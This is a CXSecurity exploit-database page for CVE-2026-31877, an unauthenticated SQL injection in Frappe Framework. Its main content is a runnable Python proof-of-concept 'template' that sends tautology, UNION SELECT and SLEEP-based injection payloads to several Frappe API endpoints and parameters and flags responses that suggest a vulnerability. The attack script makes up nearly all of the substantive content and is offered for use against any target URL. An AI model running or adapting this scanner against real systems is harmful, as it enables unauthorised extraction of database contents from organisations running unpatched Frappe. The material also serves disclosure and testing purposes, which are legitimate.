---
title: Frappe Framework < 14.99.0 and < 15.84.0 Unauthenticated SQL Injection
url: https://cxsecurity.com/issue/WLB-2026030018
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-14
fetch_date: 2026-03-15T04:24:19.040201
---

# Frappe Framework < 14.99.0 and < 15.84.0 Unauthenticated SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Frappe Framework <14.99.0 and <15.84.0 Unauthenticated SQL Injection** **2026.03.14**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-31877](https://cxsecurity.com/cveshow/CVE-2026-31877/ "Click to see CVE-2026-31877")**  CWE: **[CWE-89 Improper Neutralization of Special Elements used in an SQL Command (&#039;SQL Injection&#039;)](https://cxsecurity.com/cwe/CWE-89%20Improper%20Neutralization%20of%20Special%20Elements%20used%20in%20an%20SQL%20Command%20%28%26#039;SQL Injection&#039;) "Click to see CWE-89 Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')")** | |

#!/usr/bin/env python3
# Exploit Title: Frappe Framework Unauthenticated SQL Injection
# CVE: CVE-2026-31877
# Date: 2026-03-11
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Vendor Homepage: https://frappeframework.com
# Software Link: https://github.com/frappe/frappe
# Affected: Frappe Framework <14.99.0 and <15.84.0
# Tested on: Frappe Framework 15.x (vulnerable versions)
# Category: Webapps
# Platform: Linux / Web
# Exploit Type: Remote SQL Injection
# CVSS: 9.3 (CRITICAL)
# CWE : CWE-89
# Description: Unauthenticated SQL injection via improper field sanitization in certain API endpoints allows extraction of sensitive database information.
# Fixed in: 14.99.0 / 15.84.0
# Usage: python3 exploit.py <target>
#
# Examples:
# python3 exploit.py http://192.168.1.100:8000
#
# Options:
#
# Notes: This is a template PoC. The exact vulnerable parameter/endpoint remains undisclosed in the public advisory (GHSA-2c4m-999q-xhx4).
# Tests common historical Frappe injection points. Use only on systems you own or have explicit permission to test.
#
# How to Use
#
# Step 1: Run against a vulnerable instance (non-production only)
print(r"""
╔════════════════════════════════════════════════════════════════════════════════════════════╗
║ ║
║ ▄▄▄▄· ▄▄ ▄. ▄▄ • ▄▄▄▄▄ ▄▄▄ ▄▄▄· ▄▄▄· ▄▄▄▄▄▄▄▄▄ .▄▄▄ ▄• ▄▌ ║
║ ▐█ ▀█▪▀▄.▀·▐█ ▀ ▪•██ ▪ ▀▄ █·▐█ ▀█ ▐█ ▄█•██ ▀▀▄.▀·▀▄ █·█▪██▌ ║
║ ▐█▀▀█▄▐▀▀▪▄▄█ ▀█ ▐█.▪ ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ██▀· ▐█.▪▐▀▀▪▄▐▀▀▄ █▌▐█· ║
║ ██▄▪▐█▐█▄▄▌▐█▄▪▐█ ▐█▌·▐█▌.▐▌▐█•█▌▐█ ▪▐▌▐█▪·• ▐█▌·▐█▄▄▌▐█•█▌▐█▄█▌ ║
║ ·▀▀▀▀ ▀▀▀ ·▀▀▀▀ ▀▀▀ ▀█▄▀▪.▀ ▀ ▀ ▀ .▀ ▀▀▀ ▀▀▀ .▀ ▀ ▀▀▀ ║
║ ║
║ b a n y a m e r \_ s e c u r i t y ║
║ ║
║ >>> Silent Hunter • Shadow Presence <<< ║
║ ║
║ Operator : Mohammed Idrees Banyamer Jordan 🇯🇴 ║
║ Handle : @banyamer\_security ║
║ ║
║ CVE-2026-31877 • Frappe SQL Injection (Unauthenticated) ║
║ ║
╚════════════════════════════════════════════════════════════════════════════════════════════╝
""")
import sys
import requests
import time
import argparse
def test\_sqli(base\_url, endpoint, param, payload):
full\_url = f"{base\_url.rstrip('/')}{endpoint}"
data = {param: payload}
print(f"[\*] Testing {full\_url} → {param} = {payload[:60]}...")
try:
start = time.time()
r = requests.post(full\_url, json=data, timeout=12, verify=False)
elapsed = time.time() - start
indicators = [
"syntax error", "mysql", "sql", "near", "you have an error",
"ODBC", "quoted\_string", "unclosed quotation", "table", "column",
elapsed > 5
]
success = any(ind in r.text.lower() for ind in indicators[:10]) or elapsed > 5
if success:
print(f"[!!!] Possible SQLi – response code {r.status\_code}")
print(f" Time: {elapsed:.2f}s")
print(f" Snippet: {r.text[:400]}...")
return True
else:
print(f" → No obvious injection (code {r.status\_code}, len={len(r.text)})")
return False
except Exception as e:
print(f" → Request failed: {e}")
return False
def main(target):
common\_endpoints = [
"/api/method/frappe.desk.reportview.get",
"/api/method/frappe.model.db\_query.get\_list",
"/api/method/frappe.client.get\_list",
"/api/method/frappe.desk.query\_report.run",
"/api/resource/User",
"/api/method/frappe.search.search\_link",
"/api/method/frappe.desk.form.load.getdoc",
]
common\_params = [
"filters",
"or\_filters",
"fields",
"order\_by",
"group\_by",
"with\_parent",
"parent\_doctype",
"txt",
]
payloads = [
"' OR '1'='1",
"') OR ('1'='1",
"' OR 1=1 -- ",
"1' UNION SELECT database(),user(),version() -- ",
"'; SELECT SLEEP(5) -- ",
"1' AND SLEEP(5) -- ",
]
print(f"[+] Target: {target}\n")
found = False
for ep in common\_endpoints:
for p in common\_params:
for payload in payloads:
if test\_sqli(target, ep, p, payload):
print(f"[+] Possible vulnerable combination:")
print(f" Endpoint: {ep}")
print(f" Param: {p}")
print(f" Payload: {payload}")
found = True
if not found:
print("\n[-] No injection detected with these common patterns.")
print(" → Either patched / not vulnerable, or different endpoint/param.")
print(" → Wait for public details or analyze source diff yourself.")
if \_\_name\_\_ == "\_\_main\_\_":
parser = argparse.ArgumentParser(description="CVE-2026-31877 Frappe SQLi PoC template")
parser.add\_argument("target", help="Base URL, e.g. http://192.168.1.50:8000")
args = parser.parse\_args()
if not args.target.startswith(("http://", "https://")):
args.target = "http://" + args.target
try:
main(args.target)
except KeyboardInterrupt:
print("\n[!] Stopped by user.")
except Exception as e:
print(f"\n[!] Fatal error: {e}")

**##### References:**

https://github.com/frappe/frappe/security/advisories/GHSA-2c4m-999q-xhx4

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030018)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top